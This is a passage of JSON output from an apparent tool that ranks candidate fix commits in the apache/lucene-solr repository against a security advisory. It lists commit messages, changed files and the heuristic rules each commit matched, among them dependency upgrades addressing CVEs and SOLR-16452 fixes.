                "solr/core/src/java/org/apache/solr/cloud/overseer/ZkWriteCommand.java"
            ],
            "message_reference_content": [],
            "jira_refs": {},
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: This, SolrCloud, Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/cloud/overseer/ReplicaMutator.java, solr/core/src/java/org/apache/solr/cloud/api/collections/CreateCollectionCmd.java, solr/core/src/java/org/apache/solr/cloud/ZkController.java, solr/core/src/java/org/apache/solr/cloud/overseer/ZkWriteCommand.java, solr/core/src/java/org/apache/solr/cloud/ShardLeaderElectionContextBase.java, solr/core/src/java/org/apache/solr/cloud/overseer/SliceMutator.java",
                    "relevance": 8
                }
            ]
        },
        {
            "commit_id": "32b6d4cebb9644318de6c542c0fb2e2dbf070f00",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1698085229,
            "hunks": 38,
            "message": "Upgrade dependencies to address outstanding CVEs google-oauth-client\t1.32.1 -> 1.32.3 guava\t\t\t31.1 -> 32.1.3 hsqldb\t\t\t2.4.0 -> 2.7.1 jackson-*\t\t2.13.3 -> 2.13.5 protobuf-java\t\t3.11.0 -> 3.15.0 protobuf-java-util\t3.11.0 -> 3.15.0 snappy-java\t\t1.1.7.6 -> 1.1.10.1 woodstox-core\t\t6.2.4 -> 6.4.0 Co-authored-by: Jamie Jackson <jamiejaxon@gmail.com>",
            "changed_files": [
                "lucene/ivy-versions.properties",
                "solr/licenses/google-oauth-client-1.32.1.jar.sha1",
                "solr/licenses/google-oauth-client-1.33.3.jar.sha1",
                "solr/licenses/guava-31.1-jre.jar.sha1",
                "solr/licenses/guava-32.1.3-jre.jar.sha1",
                "solr/licenses/hsqldb-2.4.0.jar.sha1",
                "solr/licenses/hsqldb-2.7.1.jar.sha1",
                "solr/licenses/jackson-annotations-2.13.3.jar.sha1",
                "solr/licenses/jackson-annotations-2.13.5.jar.sha1",
                "solr/licenses/jackson-core-2.13.3.jar.sha1",
                "solr/licenses/jackson-core-2.13.5.jar.sha1",
                "solr/licenses/jackson-databind-2.13.3.jar.sha1",
                "solr/licenses/jackson-databind-2.13.5.jar.sha1",
                "solr/licenses/jackson-dataformat-smile-2.13.3.jar.sha1",
                "solr/licenses/jackson-dataformat-smile-2.13.5.jar.sha1",
                "solr/licenses/jackson-dataformat-xml-2.13.3.jar.sha1",
                "solr/licenses/jackson-dataformat-xml-2.13.5.jar.sha1",
                "solr/licenses/jackson-datatype-jdk8-2.13.3.jar.sha1",
                "solr/licenses/jackson-datatype-jdk8-2.13.5.jar.sha1",
                "solr/licenses/jackson-datatype-jsr310-2.13.3.jar.sha1",
                "solr/licenses/jackson-datatype-jsr310-2.13.5.jar.sha1",
                "solr/licenses/jackson-module-jaxb-annotations-2.13.3.jar.sha1",
                "solr/licenses/jackson-module-jaxb-annotations-2.13.5.jar.sha1",
                "solr/licenses/jackson-module-parameter-names-2.13.3.jar.sha1",
                "solr/licenses/jackson-module-parameter-names-2.13.5.jar.sha1",
                "solr/licenses/protobuf-java-3.11.0.jar.sha1",
                "solr/licenses/protobuf-java-3.15.0.jar.sha1",
                "solr/licenses/protobuf-java-util-3.11.0.jar.sha1",
                "solr/licenses/protobuf-java-util-3.15.0.jar.sha1",
                "solr/licenses/snappy-java-1.1.10.1.jar.sha1",
                "solr/licenses/snappy-java-1.1.7.6.jar.sha1",
                "solr/licenses/woodstox-core-6.2.4.jar.sha1",
                "solr/licenses/woodstox-core-6.4.0.jar.sha1"
            ],
            "message_reference_content": [],
            "jira_refs": {},
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/licenses/guava-31.1-jre.jar.sha1, solr/licenses/google-oauth-client-1.32.1.jar.sha1, solr/licenses/jackson-module-jaxb-annotations-2.13.3.jar.sha1, solr/licenses/woodstox-core-6.4.0.jar.sha1, solr/licenses/hsqldb-2.7.1.jar.sha1, solr/licenses/jackson-databind-2.13.5.jar.sha1, solr/licenses/jackson-dataformat-xml-2.13.3.jar.sha1, solr/licenses/snappy-java-1.1.7.6.jar.sha1, solr/licenses/protobuf-java-util-3.11.0.jar.sha1, solr/licenses/jackson-dataformat-smile-2.13.5.jar.sha1, solr/licenses/jackson-dataformat-xml-2.13.5.jar.sha1, solr/licenses/jackson-module-parameter-names-2.13.5.jar.sha1, solr/licenses/google-oauth-client-1.33.3.jar.sha1, solr/licenses/jackson-core-2.13.5.jar.sha1, solr/licenses/jackson-datatype-jsr310-2.13.5.jar.sha1, solr/licenses/jackson-core-2.13.3.jar.sha1, solr/licenses/jackson-module-jaxb-annotations-2.13.5.jar.sha1, solr/licenses/guava-32.1.3-jre.jar.sha1, solr/licenses/snappy-java-1.1.10.1.jar.sha1, solr/licenses/jackson-dataformat-smile-2.13.3.jar.sha1, solr/licenses/woodstox-core-6.2.4.jar.sha1, solr/licenses/protobuf-java-3.11.0.jar.sha1, solr/licenses/protobuf-java-util-3.15.0.jar.sha1, solr/licenses/jackson-annotations-2.13.3.jar.sha1, solr/licenses/protobuf-java-3.15.0.jar.sha1, solr/licenses/jackson-datatype-jdk8-2.13.3.jar.sha1, solr/licenses/jackson-databind-2.13.3.jar.sha1, solr/licenses/hsqldb-2.4.0.jar.sha1, solr/licenses/jackson-annotations-2.13.5.jar.sha1, solr/licenses/jackson-datatype-jdk8-2.13.5.jar.sha1, solr/licenses/jackson-module-parameter-names-2.13.3.jar.sha1, solr/licenses/jackson-datatype-jsr310-2.13.3.jar.sha1",
                    "relevance": 8
                },
                {
                    "id": "ADV_KEYWORDS_IN_MSG",
                    "message": "The commit message and the advisory description contain the following keywords: address, upgrade",
                    "relevance": 4
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: version, parameter",
                    "relevance": 4
                }
            ]
        },
        {
            "commit_id": "9cd588e028a2fed65b18e8318394222801ce6d9b",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1697810697,
            "hunks": 1,
            "message": "Use refid in jetty.xml for RewriteHandler",
            "changed_files": [
                "solr/server/etc/jetty.xml"
            ],
            "message_reference_content": [],
            "jira_refs": {},
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/server/etc/jetty.xml",
                    "relevance": 8
                },
                {
                    "id": "ADV_KEYWORDS_IN_MSG",
                    "message": "The commit message and the advisory description contain the following keywords: handler",
                    "relevance": 4
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: server",
                    "relevance": 4
                }
            ]
        },
        {
            "commit_id": "69b9aed4cd1e7544d5c25b476e1cff1d19b2b2c2",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1665986021,
            "hunks": 2,
            "message": "SOLR-16452 : do not update PRS state if the local version is newer",
            "changed_files": [
                "solr/solrj/src/java/org/apache/solr/common/cloud/DocCollection.java",
                "solr/solrj/src/java/org/apache/solr/common/cloud/PerReplicaStates.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-16452": "Here we have equal check for zk node version https://github.com/apache/solr/blob/19f109842fb34069346a9efb21cf01b6706830a8/solr/solrj/src/java/org/apache/solr/common/cloud/DocCollection.java#L149 it should be greator than from local version Keep prs state of latest version CCing noblepaul ishan Commit 157c2caaed7e62141af56518ac7b4a524df24b6e in solr's branch refs/heads/main from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=157c2caaed7 ] SOLR-16452 : do not update PRS state if the local version is newer Commit 32b6943c143371f5c34d817e9bda33e8a09b5a96 in solr's branch refs/heads/branch_9x from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=32b6943c143 ] SOLR-16452 : do not update PRS state if the local version is newer Commit 2a1d7f3492fc8f9a4a6c51c841a5d46c91660758 in solr's branch refs/heads/branch_9_1 from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=2a1d7f3492f ] SOLR-16452 : do not update PRS state if the local version is newer Looks like we need to set cversion to 0 here as well https://github.com/apache/solr/blob/8789520fb13a9b1736d030aefd48dde1fe22bc82/solr/solrj-zookeeper/src/java/org/apache/solr/common/cloud/PerReplicaStatesFetcher.java#L36 Commit 3bdeff0317d0033febf1e321ff86d9b5af65a8ed in solr's branch refs/heads/main from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=3bdeff0317d ] SOLR-16452 : initialize missing PRS with version 0 Commit 872af1d9fca5a8aa21dc366fffad2c9eba1806aa in solr's branch refs/heads/branch_9x from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=872af1d9fca ] SOLR-16452 : initialize missing PRS with version 0 Commit dd8d8c95a5aded2f6dd4e545cd16e99e28c2e33c in solr's branch refs/heads/branch_9_1 from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=dd8d8c95a5a ] SOLR-16452 : initialize missing PRS with version 0 Commit 4c2022975c6c577678eb9cb23431f3bb21d57999 in solr's branch refs/heads/branch_9_1 from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=4c2022975c6 ] SOLR-16452 :  CHANGES.txt Commit 43d0c87dceb08b2de4475c1ac4b9c45c321ce0a9 in solr's branch refs/heads/branch_9x from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=43d0c87dceb ] SOLR-16452 :  CHANGES.txt Commit 8cf60fb6f8553dfa6d1b474303c8dfac025ffdc6 in solr's branch refs/heads/main from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=8cf60fb6f85 ] SOLR-16452 :  CHANGES.txt Bulk closing 9.1 issues. Commit 69b9aed4cd1e7544d5c25b476e1cff1d19b2b2c2 in lucene-solr's branch refs/heads/branch_8_11 from Noble Paul [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=69b9aed4cd1 ] SOLR-16452 : do not update PRS state if the local version is newer"
            },
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/solrj/src/java/org/apache/solr/common/cloud/PerReplicaStates.java, solr/solrj/src/java/org/apache/solr/common/cloud/DocCollection.java",
                    "relevance": 8
                },
                {
                    "id": "ADV_KEYWORDS_IN_MSG",
                    "message": "The commit message and the advisory description contain the following keywords: version",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-16452",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "4bf6befc32b49fdb2415f25b8159110bbdd4c63f",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1698216616,
            "hunks": 3,
            "message": "Downgrading hsqldb to 2.5.2, since 2.7.x isn't supported by JDK8",
            "changed_files": [
                "lucene/ivy-versions.properties",
                "solr/licenses/hsqldb-2.5.2.jar.sha1",
                "solr/licenses/hsqldb-2.7.1.jar.sha1"
            ],
            "message_reference_content": [],
            "jira_refs": {},
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/licenses/hsqldb-2.5.2.jar.sha1, solr/licenses/hsqldb-2.7.1.jar.sha1",
                    "relevance": 8
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: version",
                    "relevance": 4
                }
            ]
        },
        {
            "commit_id": "6beb070b12c0f4bd286b5f5c8d12475e37a708fa",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1698091466,
            "hunks": 3,
            "message": "Upgrading woodstox-core to 6.5.0",
            "changed_files": [
                "lucene/ivy-versions.properties",
                "solr/licenses/woodstox-core-6.4.0.jar.sha1",
                "solr/licenses/woodstox-core-6.5.0.jar.sha1"
            ],
            "message_reference_content": [],
            "jira_refs": {},
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/licenses/woodstox-core-6.4.0.jar.sha1, solr/licenses/woodstox-core-6.5.0.jar.sha1",
                    "relevance": 8
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: version",
                    "relevance": 4
                }
            ]
        },
        {
            "commit_id": "5d91111da7de26583346772e65d13ac3a5551da6",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1698690062,
            "hunks": 2,
            "message": "Adding DOAP for previous release (8.11.2)",
            "changed_files": [
                "dev-tools/doap/lucene.rdf",
                "dev-tools/doap/solr.rdf"
            ],
            "message_reference_content": [],
            "jira_refs": {},
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: dev-tools/doap/solr.rdf",
                    "relevance": 8
                }
            ]
        },
        {
            "commit_id": "c61a410206a004b212b3a2ba681e32dd84e4f94f",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1664257053,
            "hunks": 1,
            "message": "Changing releaseWizard's England reference to UK",
            "changed_files": [
                "dev-tools/scripts/releaseWizard.py"
            ],
            "message_reference_content": [],
            "jira_refs": {},
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": []
        }
    ],
    "processing_statistics": {
        "core": {
            "retrieval of commit candidates": {
                "execution time": [
                    0.024535542353987694
                ]
            },
            "git": {
                "git": {
                    "Git": {
                        "create_commits": {
                            "execution time": [
                                0.024337105453014374
                            ]
                        }
                    }
                }
            },
            "candidates": 41,
            "commit preprocessing": {
                "execution time": [
                    0.05642258562147617
                ]
            },
            "candidates analysis": {
                "execution time": [
                    0.39474255219101906
                ]
            },
            "save commits to backend": {
                "execution time": [
                    0.035546787083148956
                ]
            },
            "execution time": [
                2.898259360343218
            ]
        },
        "rules": {
            "active": [
                17
            ],
            "matches": [
                167
            ]
        },
        "LLM": {
            "repository_url": {
                "execution time": [
                    1.6644545588642359
                ]
            },
            "commit_classification": {
                "execution time": [
                    0.01796558126807213,
                    0.01641824096441269,
                    0.016320083290338516,
                    0.01595654897391796,
                    0.016012050211429596,
                    0.015059169381856918,
                    0.015486914664506912,
                    0.016056111082434654,
                    0.015338368713855743,
                    0.015717919915914536
                ]
            }
        }
    }
}